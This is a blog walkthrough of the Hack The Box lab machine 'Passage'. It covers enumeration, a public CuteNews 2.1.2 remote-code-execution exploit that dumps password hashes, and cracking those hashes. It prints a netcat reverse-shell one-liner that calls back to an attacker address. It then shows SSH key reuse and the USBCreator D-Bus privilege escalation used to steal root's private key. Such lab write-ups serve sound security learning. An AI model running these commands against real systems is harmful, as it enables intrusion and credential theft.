---
layout: single
title: "Hackthebox write-up: Passage"
namespace: "Hackthebox write-up: Passage"
category: writeup
tags: HackTheBox htb-medium htb-linux
date: 2021-03-06 16:00:00
header:
   teaser: https://i.imgur.com/Oxk4R89.png
---

![img](https://i.imgur.com/jm8eRRi.png)

Hello everyone!

The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 

Write-ups for Hack The Box are always posted as soon as machines get retired.
{: .notice--info}

## Enumeration

Started the enumeration, as usual, by running `nmap` quickscan to check what is running on this box.

```
$ nmap -sC -sV -Pn -oA quick 10.10.10.206
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 12:58 -03
Nmap scan report for 10.10.10.206
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```

### 80/TCP - HTTP Service

Accessing the web page noticed that it is a blog built using **[CuteNews](http://cutephp.com/)** and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (`dirbuster` and related tools/techniques). 

![image-20210225141945974](https://i.imgur.com/XLBq0J7.png){: .align-center}

Inspecting the source code of the page, while searching for interesting links, found some e-mail addresses, besides the **passage.htb** domain, which was added to the local hosts file. 

```
$ curl -L http://10.10.10.206 | grep -Eo 'href="(.*)"' | grep -v 'index.php' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11085    0 11085    0     0  68006      0 --:--:-- --:--:-- --:--:-- 68006
href="CuteNews/libs/css/cosmo.min.css" rel="stylesheet"
href="CuteNews/libs/css/font-awesome.min.css" rel="stylesheet"
href="CuteNews/rss.php"><img src="CuteNews/skins/images/rss_icon.gif" alt="RSS"
href="http://cutephp.com/" title="CuteNews - PHP News Management System" style="font:9px Verdana!important;display:inline!important;visibility:visible!important;color:#003366!important;text-indent: 0px!important;"
href="mailto:kim@example.com"
href="mailto:nadav@passage.htb"
href="mailto:paul@passage.htb"
href="mailto:sid@example.com"
```

After some research about the product, found the administration page at `http://passage.htb/CuteNews` where I could identify the running version, which is **2.1.2**. 

![image-20210225154213926](https://i.imgur.com/cYxMtVe.png){: .align-center}

## Initial Foothold

Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where I've used the last one, **48800**,  to which I also needed to make some adjustments.

```
$ searchsploit cutenews 2.1.2
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)          | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                              | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                  | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                | php/webapps/48800.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

At first execution not only got a reverse shell but also a dump of all password hashes

```
$ python3 48800.py



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: T6iejum4p0 and password: T6iejum4p0

=======================================================
Sending Payload
=======================================================
signature_key: 93cc9868982b197fd95de590c77cf9b9-T6iejum4p0
signature_dsi: 4afbd01426014d57617027ee835dc2ad
logged in user: T6iejum4p0
============================
Dropping to a SHELL
============================

command > 
```

Cracking these hashes using john found a password **atlanta1**, which belongs to user **paul**, which I have discovered after some edits in the script to disclose this information, as seen below. 

```
Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
```

```
$ john -format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes
Created directory: /home/zurc/.john
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
atlanta1         (?)
1g 0:00:00:02 DONE (2021-02-25 16:02) 0.4132g/s 5926Kp/s 5926Kc/s 17794KC/s (454579)..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

With the obtained RCE as **www-data**, sent payload and retrieved an interactive reverse shell using the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`. 

## User flag

### Enumeration

After running `linpeas.sh` found some interesting information:

- This box is vulnerable to **USBCreator**

  ```
  [+] USBCreator
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
  Vulnerable!!
  ```

  Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user. 

  ```bash
  www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
  Error: GDBus.Error:org.freedesktop.DBus.Python.dbus.exceptions.DBusException: com.ubuntu.USBCreator.Error.NotAuthorized
  (According to introspection data, you need to pass 'ssb')
  ```

- Noted other 2 users in this box, where these were initially listed as e-mail addresses in the page and Paul called us attention once this is a user to which we have already cracked a password.

  ```
  [+] Users with console
  nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
  paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
  root:x:0:0:root:/root:/bin/bash
  ```

- Permissions for the console users, where **nadav** is the one that holds more privileges in the system, including being a member of **sudo** group. 

  ```
  [+] All users & groups
  uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
  uid=1001(paul) gid=1001(paul) groups=1001(paul)
  ```
  

 First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:

```
www-data@passage:~$ su paul
Password:
paul@passage:~$ cat user.txt
<redacted>
paul@passage:~$
```

## Root flag

First thing to do with *paul* credentials was another attempt to exploit USBCreator vulnerability, which failed just like www-data due to insufficient privileges.

Analyzing the user's home directory, found a RSA keypair where Paul authored it to ssh without credentials adding the public key inside `authorized_keys` file. 

```
paul@passage:~/.ssh$ ls -la
total 24
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .
drwxr-x--- 16 paul paul 4096 Feb  5 06:30 ..
-rw-r--r--  1 paul paul  395 Jul 21  2020 authorized_keys
-rw-------  1 paul paul 1679 Jul 21  2020 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21  2020 id_rsa.pub
-rw-r--r--  1 paul paul 1312 Jul 21  2020 known_hosts
```

Taking a closer look to `id_rsa.pub`, noticed that it was created by **nadav**. After seeing this I have immediately tried to ssh using the obtained private key as this user and luckily I had success on it! :smiley:

```bash
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage

$ ssh -i id_rsa nadav@10.10.10.206
Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
Finally, now as **nadav**, gave another try to USBCreator vulnerability and this time we had success once we have all required permissions to execute it. 

The USBCreator exploit allow us to get a file using root permission. If you only want to get the flag you can run the command below copying the file `root.txt` to the `/tmp` directory. 

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
```

If you want to truly get root and an interactive shell there are some possibilities that we must try:

- Obtain a copy of `/etc/shadow`, unshadow it and crack the passwords using John or Hashcat, which didn't worked for me with the dictionaries used;
- Verify the existence of  `id_rsa` file inside root profile, as well as the presence of it in the **authorized_keys**, which was the option we had success as below and obtained the root flag:

```bash
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true

## Attacker machine
$ scp -i id_rsa nadav@10.10.10.206:/tmp/somefilename .
$ chmod +600 id_rsa
$ ssh -i root@10.10.10.206
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# cat /root/root.txt
<redacted>
```

I hope it was somehow useful! 

See you in the next post! :smile:
